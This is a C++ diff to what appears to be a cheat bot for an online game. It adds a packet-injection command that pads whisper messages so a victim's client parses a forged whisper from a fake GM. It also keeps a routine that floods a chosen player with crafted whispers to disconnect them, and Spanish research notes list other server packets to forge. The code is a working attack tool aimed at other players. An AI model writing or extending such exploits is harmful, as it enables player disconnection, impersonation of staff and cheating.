@@ -100,20 +100,21 @@ void Command::attack(bool enabled){
 }
 
 string Command::process_msg(string msg){
+	msg = replace_all(msg, "||", "|");
 	size_t i1 = msg.find("["), i2, len;
-	string replace = "";
+	//string replace = "";
 	while (i1 != msg.npos){
 		i2 = msg.find("]");
 		if (i2 == msg.npos)
 			break;
 		len = i2-i1-1;
 		if (len == 0)
-			replace = color();
+			msg.replace(i1, len + 2, color());
 		else if (len == 6)
-			replace = color(msg.substr(i1+1,len));
+			msg.replace(i1, len + 2, color(msg.substr(i1 + 1, len)));
 		else
 			print_err("Error processing color tag in message");
-		msg.replace(i1, len+2, replace);
+		//msg.replace(i1, len+2, replace);
 		i1 = msg.find("[", i1+1);
 	}
 	return msg;
@@ -130,27 +131,76 @@ void Command::set_wallhack(bool enabled){
 	print(string("Set wallhack ") + (enabled ? "on." : "off."));
 }
 
-// 100 msgs de 500 le ha dc y no ha roto, 2 veces seguidas.
+void Command::_packet_injection(){
+	/*
+	[INVESTIGACION]
+	Si se pone breakpoint en parse_recv_whisper y se van viendo llegar los paquetes no ocurre el bug.
+	Lo actual funciona, se llama a la función que debe parsear el paquete malicioso, pero luego peta
+	porque el paquete siguiente no es válido.
+	Sin embargo si se quita el paquete siguiente no ocurre el bug. Probar a meter un paquete valido.
+
+	Con un paquete de whisper de longitud 500 después parece que se lo traga.
+	PROBLEMA: no puedo meter nullbytes.
+
+	Probar a meter nullbytes con otros paquetes. Aunque parece demasiado locura.
+
+	Paquetes sin nullbytes:
+	whisper
+	TPacketGCItemDel (HEADER_GC_SAFEBOX_DEL o HEADER_GC_MALL_DEL)
+	TPacketGCPhase
+	puede que chat
+	puede que TPacketGCPoints (HEADER_GC_CHARACTER_POINTS), pero no soy capaz de recibirlo
+	HEADER_GC_QUICKSLOT_ADD, HEADER_GC_QUICKSLOT_DEL, HEADER_GC_QUICKSLOT_SWAP
+	puede que TPacketGCShop
+	puede que TPacketGCDuelStart
+	puede que TPacketGCWarp? comprobar en OX
+	TPacketGCGuild
+	TPacketGCChangeSkillGroup
+	TPacketGCNPCPosition puede estar gracioso
+	TPacketGCTargetCreate: si consigo crear un target con un id sin nullbytes puedo hacer muchas cosas
+	TPacketGCLoverInfo, TPacketGCLovePointUpdate XD
+	*/
+	cout << "Performing packet injection to " << instance->username_dc << endl;
+	int i;
+	char c = '\xE1';
+	
+	string buf;
+	// padding
+	for (i = 0; i < 8; i++)
+		buf += CG_Whisper(instance->username_dc, to_string(i) + string(DISCONNECT_PACKET_LEN, c++) + to_string(i)).get_buf();
+
+	// packet
+	string username = "Lord Klecko";
+	string msg = "ola zoi un gm";
+
+	username += string(25 - username.length(), ' ');
+	msg += string(0x101 - 25 - 4 - msg.length(), ' ');
+	string packet = GC_Whisper(5, username, msg).get_buf();
+	cout << "[MALICIOUS PACKET] " << string_to_hex(packet) << endl;																								   //string packet = hex_to_string("222101014B6C65636B616161616161616161616161616161616161616141414141");
+	buf += CG_Whisper(instance->username_dc, to_string(i) + string(78, c) + packet).get_buf(); // string(500-78-packet.length(), c++) + to_string(i)).get_buf();
+
+	// Valid packet after malicious packet
+	c++;
+	i++;
+	buf += CG_Whisper(instance->username_dc, to_string(i) + string(200, c++) + to_string(i)).get_buf();
+	//buf += CG_Whisper(instance->username_dc, to_string(i) + string(78, c) + packet).get_buf();
+
+	Packet p(buf);
+	p.send();
+}
+
 void Command::_disconnect() {
 	// Igual se puede hacer gradual comprobando si el pj se ha desconectado o no
-	/*cout << "[BOT] Sending " << instance->disconnect_packets << " packets to disconnect " << instance->username_dc << endl;
-	string buf;
-	for (int i = 0; i < instance->disconnect_packets; i++)
-		buf += CG_Whisper(instance->username_dc, to_string(i) + string(DISCONNECT_PACKET_LEN, DISCONNECT_BYTE) + to_string(i)).get_buf();
-	Packet p(buf);
-	p.send();*/
-
-	
+	cout << "[BOT] Sending " << instance->disconnect_packets << " packets to disconnect " << instance->username_dc << endl;
 	char c = 'a';
 	int i = 0;
 	while (instance->disconnecting && i < instance->disconnect_packets) {
-		cout << "[BOT] Sending msg " << i << " to " << instance->username_dc << endl;
+		//cout << "[BOT] Sending msg " << i << " to " << instance->username_dc << endl;
 		CG_Whisper p(instance->username_dc, to_string(i) + string(DISCONNECT_PACKET_LEN, DISCONNECT_BYTE) + to_string(i));
 		p.send();
 		//Sleep(1);
 		i++;
 	}
-	
 	instance->disconnecting = false;
 }
 
@@ -163,6 +213,10 @@ void Command::disconnect(const string& username, int n_packets){
 	}
 }
 
+void Command::packet_injection(const string& username){
+	instance->username_dc = username;
+	_packet_injection();
+}
 
 void Command::run(const string& _cmd){
 	bool check = true;
@@ -222,6 +276,11 @@ void Command::run(const string& _cmd){
 
 	} else if (cmd[0] == "dc_stop"){
 		instance->disconnecting = false;
+
+	}
+	else if (cmd[0] == "inj") {
+		if (check = check_n_args(1, cmd))
+			packet_injection(cmd[1]);
 
 	} else print_err("Unknown command: " + cmd[0]);
 
